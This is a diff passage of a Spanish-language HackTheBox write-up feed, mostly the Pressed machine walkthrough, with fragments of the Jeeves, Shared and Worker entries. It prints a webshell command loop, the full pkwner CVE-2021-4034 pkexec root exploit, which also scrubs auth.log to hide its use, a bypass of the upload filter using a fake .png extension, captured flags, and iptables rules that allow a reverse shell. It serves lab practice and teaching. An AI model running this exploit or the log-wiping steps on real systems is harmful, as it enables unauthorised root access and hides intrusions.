+<img src="/assets/hackthebox/img/machines/hard/pressed/7.png" />
+</p>
+
+<ul>
+  <li>Podemos ejecutar comandos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/pressed/8.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Bueno esta máquina tiene <code class="language-plaintext highlighter-rouge">IPtables</code> por detrás y no podemos enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code> por ningún protocolo.</p>
+  </li>
+  <li>
+    <p>Tenemos que crear una <code class="language-plaintext highlighter-rouge">webshell</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  wordpress_xmlrpc <span class="nb">cat </span>script.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2"> [+]Saliendo .... </span><span class="se">\n</span><span class="s2">"</span>
+    <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="c">#Ctrl + c</span>
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="nv">main_url</span><span class="o">=</span><span class="s2">"http://pressed.htb/index.php/2022/01/28/hello-world/?cmd="</span>
+
+<span class="k">while</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$command</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"exit"</span> <span class="o">]</span><span class="p">;</span> <span class="k">do
+	</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$~</span><span class="s2"> "</span> <span class="o">&amp;&amp;</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nb">command
+	command</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$command</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'+'</span><span class="si">)</span><span class="s2">"</span>
+
+	curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"</span><span class="nv">$main_url$command</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nt">-A</span> 100 | <span class="nb">grep</span> <span class="s2">"&lt;/pre&gt;"</span> <span class="nt">-B</span> 100 | <span class="nb">sed</span> <span class="s1">'s/&lt;pre&gt;//'</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;\/pre&gt;//'</span> | <span class="nb">sed</span> <span class="s1">'s/shell//'</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ejecutar comandos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  wordpress_xmlrpc ./script.sh
+<span class="nv">$~</span> <span class="nb">whoami
+</span>www-data
+
+<span class="nv">$~</span> <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+
+<span class="nv">$~</span> <span class="nb">hostname</span> <span class="nt">-I</span>
+10.10.11.142
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Podemos ver la <code class="language-plaintext highlighter-rouge">flag</code> también desde aquí.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">ls</span> <span class="nt">-l</span> /home/htb/user.txt
+<span class="nt">-rw-r--r--</span> 1 root root 33 Jun 24 21:36 /home/htb/user.txt
+
+<span class="nv">$~</span> <span class="nb">cat</span> /home/htb/user.txt
+14a81d1565421c5c1461e1ad9b182b5b
+</code></pre></div></div>
+
+<ul>
+  <li>No podemos cambiar de ruta por que no estamos dentro del sistema estamos desde fuera ejecutando comandos y como el script esta en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html</code> por eso solo podemos quedarnos allí.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">pwd
+cd</span>/var/www/html
+
+<span class="nv">$~</span> <span class="nb">cd</span> ..
+
+<span class="nv">$~</span> <span class="nb">pwd</span>
+/var/www/html
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ir hacia atrás con este comando.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">cd</span> ../ %26%26 <span class="nb">pwd</span>
+/var/www
+</code></pre></div></div>
+
+<ul>
+  <li>El <code class="language-plaintext highlighter-rouge">pkexec</code> es <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$~</span> <span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pkexec
+<span class="nt">-rwsr-xr-x</span> 1 root root 23440 Jul 14  2021 /usr/bin/pkexec
+</code></pre></div></div>
+
+<ul>
+  <li>Para poder explotarlo desde fuera vamos a necesitar el siguiente script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
+  <li><a href="https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh">https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh</a></li>
+  <li>Podemos ejecutar un id para ver si estamos como root.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>pkwner.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ "</span>
+<span class="nb">echo</span> <span class="s2">"██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗"</span>
+<span class="nb">echo</span> <span class="s2">"██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝"</span>
+<span class="nb">echo</span> <span class="s2">"██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗"</span>
+<span class="nb">echo</span> <span class="s2">"██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║"</span>
+<span class="nb">echo</span> <span class="s2">"╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝"</span>
+<span class="nb">echo</span> <span class="s2">"CVE-2021-4034 PoC by Kim Schulz"</span>
+<span class="c"># shell poc by Kim Schulz</span>
+<span class="nb">echo</span> <span class="s2">"[+] Setting up environment..."</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s1">'GCONV_PATH=.'</span>
+<span class="nb">touch</span> <span class="s1">'GCONV_PATH=./pkwner'</span>
+<span class="nb">chmod </span>a+x <span class="s1">'GCONV_PATH=./pkwner'</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> pkwner
+<span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules
+<span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void gconv() {}
+void gconv_init() {
+  printf("hello");
+  setuid(0); setgid(0);
+	seteuid(0); setegid(0);
+  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
+         "rm -rf 'GCONV_PATH=.' 'pkwner';"
+         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"
+         "id");
+	exit(0);
+}
+</span><span class="no">EOM
+
+</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/exec.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
+                 "SHELL=pkwner", NULL};
+  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
+}
+</span><span class="no">EOM
+</span><span class="nb">echo</span> <span class="s2">"[+] Build offensive gconv shared module..."</span>
+gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> pkwner/pkwner.so pkwner/pkwner.c
+<span class="nb">echo</span> <span class="s2">"[+] Build mini executor..."</span>
+gcc <span class="nt">-o</span> pkwner/executor pkwner/exec.c
+<span class="c"># export PATH="GCONV_PATH=."</span>
+<span class="c"># export CHARSET="PKWNER"</span>
+<span class="c">#export SHELL=pkwner</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s1">'GCONV_PATH=.'</span> ./pkwner/executor
+<span class="nb">echo</span> <span class="s2">"[+] Nice Job"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a subirlo a la máquina desde el python3 interactivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc.methods import media
+<span class="o">&gt;&gt;&gt;</span> with open<span class="o">(</span><span class="s2">"pkwner.sh"</span>, <span class="s2">"r"</span><span class="o">)</span> as f:
+...     filename <span class="o">=</span> f.read<span class="o">()</span>
+...
+<span class="o">&gt;&gt;&gt;</span> filename
+<span class="s1">'#!/bin/bash\necho "██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ "\necho "██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗"\necho "██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝"\necho "██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗"\necho "██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║"\necho "╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝"\necho "CVE-2021-4034 PoC by Kim Schulz"\n# shell poc by Kim Schulz\necho "[+] Setting up environment..."\nmkdir -p \'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>.<span class="se">\'\n</span><span class="nb">touch</span> <span class="se">\'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>./pkwner<span class="se">\'\n</span><span class="nb">chmod </span>a+x <span class="se">\'</span><span class="nv">GCONV_PATH</span><span class="o">=</span>./pkwner<span class="se">\'\n</span><span class="nb">mkdir</span> <span class="nt">-p</span> pkwner<span class="se">\n</span><span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules<span class="se">\n</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="se">\n</span><span class="sh">#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;unistd.h&gt;</span><span class="se">\n</span><span class="sh">void gconv() {}</span><span class="se">\n</span><span class="sh">void gconv_init() {</span><span class="se">\n</span><span class="sh">  printf("hello");</span><span class="se">\n</span><span class="sh">  setuid(0); setgid(0);</span><span class="se">\n\t</span><span class="sh">seteuid(0); setegid(0);</span><span class="se">\n</span><span class="sh">  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"</span><span class="se">\n</span><span class="sh">         "rm -rf </span><span class="se">\'</span><span class="sh">GCONV_PATH=.</span><span class="se">\'</span><span class="sh"> </span><span class="se">\'</span><span class="sh">pkwner</span><span class="se">\'</span><span class="sh">;"</span><span class="se">\n</span><span class="sh">         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"</span><span class="se">\n</span><span class="sh">         "id");</span><span class="se">\n\t</span><span class="sh">exit(0);</span><span class="se">\n</span><span class="sh">}</span><span class="se">\n</span><span class="sh">EOM</span><span class="se">\n\n</span><span class="sh">cat &gt; pkwner/exec.c &lt;&lt;- EOM</span><span class="se">\n</span><span class="sh">#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="sh">#include &lt;unistd.h&gt;</span><span class="se">\n</span><span class="sh">int main(){</span><span class="se">\n</span><span class="sh">  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",</span><span class="se">\n</span><span class="sh">                 "SHELL=pkwner", NULL};</span><span class="se">\n</span><span class="sh">  execve("/usr/bin/pkexec", (char *[]){NULL}, env);</span><span class="se">\n</span><span class="sh">}</span><span class="se">\n</span><span class="sh">EOM</span><span class="se">\n</span><span class="sh">echo "[+] Build offensive gconv shared module..."</span><span class="se">\n</span><span class="sh">gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c</span><span class="se">\n</span><span class="sh">echo "[+] Build mini executor..."</span><span class="se">\n</span><span class="sh">gcc -o pkwner/executor pkwner/exec.c</span><span class="se">\n</span><span class="sh"># export PATH="GCONV_PATH=."</span><span class="se">\n</span><span class="sh"># export CHARSET="PKWNER"</span><span class="se">\n</span><span class="sh">#export SHELL=pkwner</span><span class="se">\n</span><span class="sh">PATH=</span><span class="se">\'</span><span class="sh">GCONV_PATH=.</span><span class="se">\'</span><span class="sh"> ./pkwner/executor</span><span class="se">\n</span><span class="sh">echo "[+] Nice Job"</span><span class="se">\n</span><span class="sh">'
+&gt;&gt;&gt; data_upload = { 'name': 'pkwner.sh', 'bits': filename, 'type': 'text/plain'}
+&gt;&gt;&gt; client.call(media.UploadFile(data_upload))
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+  File "/home/miguel/.local/lib/python3.11/site-packages/wordpress_xmlrpc/base.py", line 37, in call
+    raw_result = server_method(*args)
+                 ^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 1122, in __call__
+    return self.__send(self.__name, args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 1464, in __request
+    response = self.__transport.request(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 1166, in request
+    return self.single_request(host, handler, request_body, verbose)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 1182, in single_request
+    return self.parse_response(resp)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 1354, in parse_response
+    return u.close()
+           ^^^^^^^^^
+  File "/usr/lib/python3.11/xmlrpc/client.py", line 668, in close
+    raise Fault(**self._stack[0])
+xmlrpc.client.Fault: &lt;Fault 500: 'Could not write file pkwner.sh (Sorry, you are not allowed to upload this file type.).'&gt;
+</span></code></pre></div></div>
+
+<ul>
+  <li>Nos da un error no podemos subir ese tipo de archivo es por la extensión que tiene vamos a cambiarla para ver si nos deja.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> data_upload <span class="o">=</span> <span class="o">{</span> <span class="s1">'name'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'bits'</span>: filename, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span><span class="o">}</span>
+<span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>media.UploadFile<span class="o">(</span>data_upload<span class="o">))</span>
+<span class="o">{</span><span class="s1">'attachment_id'</span>: <span class="s1">'48'</span>, <span class="s1">'date_created_gmt'</span>: &lt;DateTime <span class="s1">'20240625T00:46:03'</span> at 0x7f932bf77ed0&gt;, <span class="s1">'parent'</span>: 0, <span class="s1">'link'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span>, <span class="s1">'title'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'caption'</span>: <span class="s1">''</span>, <span class="s1">'description'</span>: <span class="s1">''</span>, <span class="s1">'metadata'</span>: False, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span>, <span class="s1">'thumbnail'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span>, <span class="s1">'id'</span>: <span class="s1">'48'</span>, <span class="s1">'file'</span>: <span class="s1">'pkwner.png'</span>, <span class="s1">'url'</span>: <span class="s1">'/wp-content/uploads/2024/06/pkwner.png'</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos la ruta donde se subió.</li>
+  <li>Y funciona somos <code class="language-plaintext highlighter-rouge">root</code> ya que le dijimos que nos ejecutara el comando <code class="language-plaintext highlighter-rouge">id</code>.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  wordpress_xmlrpc rlwrap ./script.sh
+$~ bash /var/www/html/wp-content/uploads/2024/06/pkwner.png
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+[+] Setting up environment...
+[+] Build offensive gconv shared module...
+[+] Build mini executor...
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+hello[+] Nice Job
+</code></pre></div></div>
+
+<ul>
+  <li>Modificamos el script.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>new.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ "</span>
+<span class="nb">echo</span> <span class="s2">"██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗"</span>
+<span class="nb">echo</span> <span class="s2">"██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝"</span>
+<span class="nb">echo</span> <span class="s2">"██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗"</span>
+<span class="nb">echo</span> <span class="s2">"██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║"</span>
+<span class="nb">echo</span> <span class="s2">"╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝"</span>
+<span class="nb">echo</span> <span class="s2">"CVE-2021-4034 PoC by Kim Schulz"</span>
+<span class="c"># shell poc by Kim Schulz</span>
+<span class="nb">echo</span> <span class="s2">"[+] Setting up environment..."</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s1">'GCONV_PATH=.'</span>
+<span class="nb">touch</span> <span class="s1">'GCONV_PATH=./pkwner'</span>
+<span class="nb">chmod </span>a+x <span class="s1">'GCONV_PATH=./pkwner'</span>
+<span class="nb">mkdir</span> <span class="nt">-p</span> pkwner
+<span class="nb">echo</span> <span class="s2">"module UTF-8// PKWNER// pkwner 2"</span> <span class="o">&gt;</span> pkwner/gconv-modules
+<span class="nb">cat</span> <span class="o">&gt;</span> pkwner/pkwner.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void gconv() {}
+void gconv_init() {
+  printf("hello");
+  setuid(0); setgid(0);
+	seteuid(0); setegid(0);
+  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
+         "rm -rf 'GCONV_PATH=.' 'pkwner';"
+         "cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;"
+         "cat /root/root.txt");
+	exit(0);
+}
+</span><span class="no">EOM
+
+</span><span class="nb">cat</span> <span class="o">&gt;</span> pkwner/exec.c <span class="o">&lt;&lt;-</span> <span class="no">EOM</span><span class="sh">
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
+                 "SHELL=pkwner", NULL};
+  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
+}
+</span><span class="no">EOM
+</span><span class="nb">echo</span> <span class="s2">"[+] Build offensive gconv shared module..."</span>
+gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> pkwner/pkwner.so pkwner/pkwner.c
+<span class="nb">echo</span> <span class="s2">"[+] Build mini executor..."</span>
+gcc <span class="nt">-o</span> pkwner/executor pkwner/exec.c
+<span class="c"># export PATH="GCONV_PATH=."</span>
+<span class="c"># export CHARSET="PKWNER"</span>
+<span class="c">#export SHELL=pkwner</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s1">'GCONV_PATH=.'</span> ./pkwner/executor
+<span class="nb">echo</span> <span class="s2">"[+] Nice Job"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Volvemos hacer todo el proceso en python3 y al final ejecutamos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> data_upload <span class="o">=</span> <span class="o">{</span> <span class="s1">'name'</span>: <span class="s1">'new.png'</span>, <span class="s1">'bits'</span>: filename, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span><span class="o">}</span>
+<span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>media.UploadFile<span class="o">(</span>data_upload<span class="o">))</span>
+<span class="o">{</span><span class="s1">'attachment_id'</span>: <span class="s1">'57'</span>, <span class="s1">'date_created_gmt'</span>: &lt;DateTime <span class="s1">'20240625T02:22:16'</span> at 0x7fd3870a7750&gt;, <span class="s1">'parent'</span>: 0, <span class="s1">'link'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span>, <span class="s1">'title'</span>: <span class="s1">'new.png'</span>, <span class="s1">'caption'</span>: <span class="s1">''</span>, <span class="s1">'description'</span>: <span class="s1">''</span>, <span class="s1">'metadata'</span>: False, <span class="s1">'type'</span>: <span class="s1">'text/plain'</span>, <span class="s1">'thumbnail'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span>, <span class="s1">'id'</span>: <span class="s1">'57'</span>, <span class="s1">'file'</span>: <span class="s1">'new.png'</span>, <span class="s1">'url'</span>: <span class="s1">'/wp-content/uploads/2024/06/new.png'</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./script.sh
+<span class="nv">$~</span>  bash /var/www/html/wp-content/uploads/2024/06/new.png
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+<span class="o">[</span>+] Setting up environment...
+<span class="o">[</span>+] Build offensive gconv shared module...
+<span class="o">[</span>+] Build mini executor...
+10b224d4bc6cab7b7fbd9f4deb10b9eb
+hello[+] Nice Job
+</code></pre></div></div>
+
+<blockquote>
+  <p>Para ganar <code class="language-plaintext highlighter-rouge">shell</code> hay que ejecutar 2 comandos de <code class="language-plaintext highlighter-rouge">IPTables</code> para que acepte trafico de nuestra IP y poder entablar la reverse <code class="language-plaintext highlighter-rouge">shell</code>.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">-A</span> OUTPUT <span class="nt">-p</span> tcp <span class="nt">-d</span> 10.10.14.63 <span class="nt">-j</span> ACCEPT
+iptables <span class="nt">-A</span> INPUT <span class="nt">-p</span> tcp <span class="nt">-s</span> 10.10.14.63 <span class="nt">-j</span> ACCEPT
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Jeeves (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" rel="alternate" type="text/html" title="HackTheBox - Jeeves (medium)" /><published>2024-06-22T00:00:00-06:00</published><updated>2024-06-22T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png" />
 </p>
 
@@ -8916,1045 +10100,4 @@ root@shared:/var/lib/redis#
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shared:/var/lib/redis# <span class="nb">cat</span> /root/root.txt
 <span class="nb">cat</span> /root/root.txt
 a5f9fb3e112adc4dd4e6650e64d240e1
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Worker (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" rel="alternate" type="text/html" title="HackTheBox - Worker (medium)" /><published>2024-05-17T00:00:00-06:00</published><updated>2024-05-17T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png" />
-</p>
-
-<ul>
-  <li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,3690,5985 10.10.10.203 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-14 18:47 CST
-Nmap scan report <span class="k">for </span>10.10.10.203
-Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT     STATE SERVICE  VERSION
-80/tcp   open  http     Microsoft IIS httpd 10.0
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: IIS Windows Server
-3690/tcp open  svnserve Subversion
-5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>Comenzamos enumerando el puerto 80.</li>
-</ul>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span>
-<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
-</code></pre></div></div>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/worker/1.png" />
